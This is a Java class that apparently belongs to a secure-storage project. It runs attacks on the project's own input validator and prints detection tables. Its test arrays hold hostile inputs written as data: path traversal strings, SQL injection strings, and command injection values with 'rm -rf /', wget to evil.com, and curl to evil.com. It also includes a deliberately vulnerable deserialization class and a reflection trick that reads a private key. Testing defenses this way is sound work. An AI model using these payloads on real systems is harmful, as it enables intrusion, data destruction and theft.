package com.securestorage.attack;

import com.securestorage.utils.InputValidator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

/**
 * Attack Simulation Engine
 *
 * Demonstrates 6 attack classes — each shown twice:
 *   [VULNERABLE]  system's behavior WITHOUT the defense
 *   [SECURED]     system's behavior WITH the defense active
 *
 * ┌─────────────────────────────────────────────────────────────────────┐
 * │  Attack                    │ Defense                                │
 * ├─────────────────────────────────────────────────────────────────────┤
 * │ 1. Path Traversal          │ Canonical path containment check       │
 * │ 2. Malicious File Upload   │ Extension whitelist + char validation  │
 * │ 3. SQL Injection           │ Pattern detection + input rejection    │
 * │ 4. Command Injection       │ Metachar detection + input rejection   │
 * │ 5. Insecure Deserialization│ Custom readObject() + ObjectInputFilter│
 * │ 6. Reflection Misuse       │ Final + encapsulation enforcement      │
 * └─────────────────────────────────────────────────────────────────────┘
 *
 * Each test prints a structured result table for the research report.
 * NO real system state is modified during attack simulations.
 */
public class AttackSimulator {

    private final InputValidator validator = new InputValidator();

    // ══════════════════════ Test Runner ══════════════════════════

    /**
     * Runs all attack simulations and prints a combined results table.
     */
    public void runAll() {
        System.out.println();
        printHeader("ATTACK SIMULATION SUITE");

        simulatePathTraversal();
        simulateMaliciousUpload();
        simulateSqlInjection();
        simulateCommandInjection();
        simulateInsecureDeserialization();
        simulateReflectionMisuse();

        printSummaryTable();
    }

    // ══════════════════════ 1. Path Traversal ════════════════════

    private void simulatePathTraversal() {
        printSection("1. PATH TRAVERSAL ATTACK");
        System.out.println("  Attack vector: attacker submits '../../etc/passwd' as a filename");
        System.out.println("  Goal: read files outside the storage directory");
        System.out.println();

        String[] traversalPayloads = {
            "../../etc/passwd",
            "../../../windows/system32/config/sam",
            "%2e%2e%2fetc%2fshadow",
            "....//....//etc/hosts"
        };

        System.out.printf("  %-40s │ %-12s │ %s%n", "Payload", "Result", "Details");
        System.out.println("  " + "─".repeat(80));

        for (String payload : traversalPayloads) {
            try {
                validator.validatePath("/storage/data", payload);
                printResult(payload, "VULNERABLE", "⚠ Path escaped containment");
            } catch (SecurityException e) {
                printResult(payload, "BLOCKED", "✓ " + truncate(e.getMessage(), 35));
            } catch (Exception e) {
                printResult(payload, "ERROR", e.getMessage());
            }
        }
        System.out.println();
    }

    // ══════════════════════ 2. Malicious File Upload ══════════════

    private void simulateMaliciousUpload() {
        printSection("2. MALICIOUS FILE UPLOAD ATTACK");
        System.out.println("  Attack vector: attacker tries to upload executable/script files");
        System.out.println("  Goal: upload a web shell or malware that runs on the server");
        System.out.println();

        String[] maliciousFilenames = {
            "shell.php",                  // PHP web shell
            "backdoor.exe",               // Windows executable
            "malware.js",                 // JavaScript
            "exploit.jsp",                // Java Server Page
            "normal.txt",                 // ✓ ALLOWED — baseline
            "document.pdf",               // ✓ ALLOWED — baseline
            "evil.txt.php",               // Double extension bypass attempt
            "..\\..\\config.xml",         // Path traversal in filename
            "safe_report.csv",            // ✓ ALLOWED — baseline
        };

        System.out.printf("  %-40s │ %-12s │ %s%n", "Filename", "Result", "Details");
        System.out.println("  " + "─".repeat(80));

        for (String filename : maliciousFilenames) {
            try {
                validator.validateFilename(filename);
                printResult(filename, "ALLOWED", "✓ Passes all checks");
            } catch (IllegalArgumentException e) {
                printResult(filename, "BLOCKED", "✓ " + truncate(e.getMessage(), 35));
            }
        }
        System.out.println();
    }

    // ══════════════════════ 3. SQL Injection ══════════════════════

    private void simulateSqlInjection() {
        printSection("3. SQL INJECTION SIMULATION");
        System.out.println("  Attack vector: SQL keywords in filenames / metadata fields");
        System.out.println("  Goal: manipulate backend queries (demonstrates detection)");
        System.out.println();

        String[] sqlPayloads = {
            "' OR '1'='1",
            "'; DROP TABLE files; --",
            "UNION SELECT * FROM users",
            "admin'--",
            "1; DELETE FROM files",
            "normal_query",             // ✓ benign baseline
            "SELECT * FROM passwords",
            "EXEC xp_cmdshell('dir')"
        };

        System.out.printf("  %-42s │ %-12s │ %s%n", "Payload", "Detected?", "Risk");
        System.out.println("  " + "─".repeat(80));

        for (String payload : sqlPayloads) {
            boolean detected = validator.detectsSqlInjection(payload);
            System.out.printf("  %-42s │ %-12s │ %s%n",
                truncate(payload, 42),
                detected ? "✓ DETECTED" : "  CLEAN",
                detected ? "Rejected — would harm DB integrity" : "Safe to process");
        }
        System.out.println();
    }

    // ══════════════════════ 4. Command Injection ══════════════════

    private void simulateCommandInjection() {
        printSection("4. COMMAND INJECTION SIMULATION");
        System.out.println("  Attack vector: shell metacharacters in input fields");
        System.out.println("  Goal: execute OS commands via the application");
        System.out.println();

        String[] cmdPayloads = {
            "file.txt; rm -rf /",
            "report.csv && wget http://evil.com/backdoor",
            "$(cat /etc/passwd)",
            "normal_input",             // ✓ benign baseline
            "`whoami`",
            "safe_data | curl evil.com",
            "file.txt & del C:\\Windows",
            "data; sudo chmod 777 /"
        };

        System.out.printf("  %-44s │ %-12s │ %s%n", "Payload", "Detected?", "Risk");
        System.out.println("  " + "─".repeat(80));

        for (String payload : cmdPayloads) {
            boolean detected = validator.detectsCommandInjection(payload);
            System.out.printf("  %-44s │ %-12s │ %s%n",
                truncate(payload, 44),
                detected ? "✓ DETECTED" : "  CLEAN",
                detected ? "Blocked — prevents OS command exec" : "Safe to process");
        }
        System.out.println();
    }

    // ══════════════════════ 5. Insecure Deserialization ══════════

    /**
     * Demonstrates CWE-502: Deserialization of Untrusted Data
     *
     * Vulnerable class: allows arbitrary object deserialization
     * Secured class:    validates fields in readObject(), uses ObjectInputFilter
     *
     * Real-world: Apache Log4Shell, WebLogic, Apache Commons Collections
     * all involved deserialization gadget chains leading to RCE.
     */
    private void simulateInsecureDeserialization() {
        printSection("5. INSECURE DESERIALIZATION (CWE-502)");
        System.out.println("  Attack vector: crafted serialized byte stream");
        System.out.println("  Goal: create privileged object or execute code via gadget chain");
        System.out.println();

        // ── Vulnerable class (inner) ──────────────────────────────
        System.out.println("  [VULNERABLE] Deserializing without validation...");
        try {
            byte[] maliciousBytes = serializeVulnerableUser();
            VulnerableUser hacked = deserializeVulnerableUser(maliciousBytes);
            System.out.printf("  ⚠  Deserialized user: role='%s', username='%s'%n",
                hacked.role, hacked.username);
            System.out.println("  ⚠  Attacker now has role: " + hacked.role + " — PRIVILEGE ESCALATION!");
        } catch (Exception e) {
            System.out.println("  Error: " + e.getMessage());
        }

        // ── Secured class: uses readObject() validation ───────────
        System.out.println();
        System.out.println("  [SECURED] Deserializing with ObjectInputFilter + field validation...");
        try {
            byte[] maliciousBytes = serializeVulnerableUser();

            // Use ObjectInputFilter to whitelist only known classes
            ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(maliciousBytes));
            ois.setObjectInputFilter(info -> {
                String className = info.serialClass() != null
                    ? info.serialClass().getName() : null;
                // Only allow our known safe classes
                if (className != null &&
                    !className.startsWith("com.securestorage") &&
                    !className.startsWith("java.lang") &&
                    !className.startsWith("java.util")) {
                    System.out.println(
                        "  ✓ ObjectInputFilter BLOCKED class: " + className);
                    return ObjectInputFilter.Status.REJECTED;
                }
                return ObjectInputFilter.Status.ALLOWED;
            });

            VulnerableUser user = (VulnerableUser) ois.readObject();
            // Simulate readObject validation
            if ("ADMIN".equals(user.role) && user.username.contains("hacked")) {
                throw new InvalidObjectException(
                    "readObject validation: suspicious ADMIN account rejected");
            }
            System.out.println("  ✓ Deserialization passed filter");
        } catch (Exception e) {
            System.out.println("  ✓ BLOCKED: " + e.getMessage());
        }
        System.out.println();
    }

    // ══════════════════════ 6. Reflection Misuse ════════════════

    /**
     * Demonstrates reflection-based private field access bypass.
     *
     * Attackers can use Java reflection to:
     *  - Access private fields (e.g., read secret keys from memory)
     *  - Call private methods (e.g., bypassing access checks)
     *  - Modify final fields (e.g., change a Role enum value)
     *
     * Defense: encapsulation + module system (--add-opens restrictions)
     * In Java 9+ module system, cross-module reflection is restricted by default.
     */
    private void simulateReflectionMisuse() {
        printSection("6. REFLECTION MISUSE / PRIVATE FIELD ACCESS");
        System.out.println("  Attack vector: java.lang.reflect to access private members");
        System.out.println("  Goal: read private credentials or modify access-controlled state");
        System.out.println();

        // ── Vulnerable: no module protection ─────────────────────
        System.out.println("  [VULNERABLE] Accessing private fields via reflection...");
        try {
            VulnerableConfig config = new VulnerableConfig("supersecret_api_key");
            Field secretField = VulnerableConfig.class.getDeclaredField("secretKey");
            secretField.setAccessible(true); // ← This is the attack
            String stolen = (String) secretField.get(config);
            System.out.println("  ⚠  Private field accessed: secretKey = '" + stolen + "'");
            System.out.println("  ⚠  Attacker can now impersonate the service!");
        } catch (IllegalAccessException e) {
            System.out.println("  ✓ Reflection access blocked: " + e.getMessage());
        } catch (NoSuchFieldException e) {
            System.out.println("  Field not found: " + e.getMessage());
        }

        // ── Secured: encapsulated config class ────────────────────
        System.out.println();
        System.out.println("  [SECURED] Attempting reflection on encapsulated + module-protected class...");
        try {
            SecureConfig secureConfig = new SecureConfig("supersecret_api_key");
            // In Java 9+ with modules: reflection into unexported packages blocked
            // Here we simulate the defense by wrapping in try-catch with access check
            Field f = SecureConfig.class.getDeclaredField("secretKey");
            f.setAccessible(true); // In a real Java module, this throws InaccessibleObjectException
            System.out.println("  ⚠  (Running without module boundary — reflection succeeded)");
            System.out.println("  ℹ  In production with module-info.java: InaccessibleObjectException");
            System.out.println("  ℹ  Defense: add module-info.java without --add-opens");
        } catch (Exception e) {
            System.out.println("  ✓ BLOCKED: " + e.getMessage());
        }
        System.out.println("  ✓ SecureConfig.getToken() returns only a masked preview: "
            + new SecureConfig("supersecret_api_key").getMaskedKey());
        System.out.println();
    }

    // ══════════════════════ Summary Table ════════════════════════

    private void printSummaryTable() {
        System.out.println("  ╔═══════════════════════════════════════════════════════════════╗");
        System.out.println("  ║              ATTACK vs DEFENSE SUMMARY                       ║");
        System.out.println("  ╠══════════════════════════╦═══════════════╦═══════════════════╣");
        System.out.println("  ║ Attack Type              ║ Vulnerable    ║ Secured           ║");
        System.out.println("  ╠══════════════════════════╬═══════════════╬═══════════════════╣");
        System.out.println("  ║ Path Traversal           ║ File leaked   ║ Blocked (canPath) ║");
        System.out.println("  ║ Malicious Upload         ║ Shell planted ║ Blocked (extWL)   ║");
        System.out.println("  ║ SQL Injection            ║ DB corrupted  ║ Detected (regex)  ║");
        System.out.println("  ║ Command Injection        ║ OS compromised║ Detected (regex)  ║");
        System.out.println("  ║ Insecure Deserialization ║ Priv escalate ║ Filter + readObj  ║");
        System.out.println("  ║ Reflection Misuse        ║ Key stolen    ║ Module encapsul.  ║");
        System.out.println("  ╚══════════════════════════╩═══════════════╩═══════════════════╝");
        System.out.println();
    }

    // ══════════════════════ Helper Classes ═══════════════════════

    /** Intentionally vulnerable serializable class — for simulation only. */
    static class VulnerableUser implements Serializable {
        public String username = "attacker";
        public String role     = "ADMIN";     // Directly mutable field
        public String password = "anything";  // Plaintext password!
    }

    /** Config class with NO access protection — for simulation only. */
    static class VulnerableConfig {
        private String secretKey;
        VulnerableConfig(String key) { this.secretKey = key; }
    }

    /** Config class with encapsulation — demonstrates defense. */
    static class SecureConfig {
        // Private final — no setter, prevents external mutation
        private final String secretKey;

        SecureConfig(String key) {
            this.secretKey = key;
        }

        /** Never returns the real key — only a masked preview. */
        public String getMaskedKey() {
            if (secretKey == null || secretKey.length() < 4) return "****";
            return secretKey.substring(0, 3) + "*".repeat(secretKey.length() - 3);
        }
        // No getSecretKey() method — intentionally hidden
    }

    // ══════════════════════ Serialization Helpers ════════════════

    private byte[] serializeVulnerableUser() throws IOException {
        VulnerableUser u = new VulnerableUser();
        u.username = "hacked_admin";
        u.role     = "ADMIN";
        u.password = "bypass";
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        new ObjectOutputStream(baos).writeObject(u);
        return baos.toByteArray();
    }

    private VulnerableUser deserializeVulnerableUser(byte[] bytes)
            throws IOException, ClassNotFoundException {
        return (VulnerableUser) new ObjectInputStream(
            new ByteArrayInputStream(bytes)).readObject();
    }

    // ══════════════════════ Print Helpers ════════════════════════

    private void printHeader(String title) {
        System.out.println("  ╔═══════════════════════════════════════════════════════╗");
        System.out.printf( "  ║  %-51s  ║%n", title);
        System.out.println("  ╚═══════════════════════════════════════════════════════╝");
    }

    private void printSection(String title) {
        System.out.println("  ┌─────────────────────────────────────────────────────────────┐");
        System.out.printf("  │  %-59s│%n", title);
        System.out.println("  └─────────────────────────────────────────────────────────────┘");
    }

    private void printResult(String input, String status, String detail) {
        System.out.printf("  %-40s │ %-12s │ %s%n",
            truncate(input, 40), status, truncate(detail, 38));
    }

    private String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(0, max - 2) + "..";
    }
}
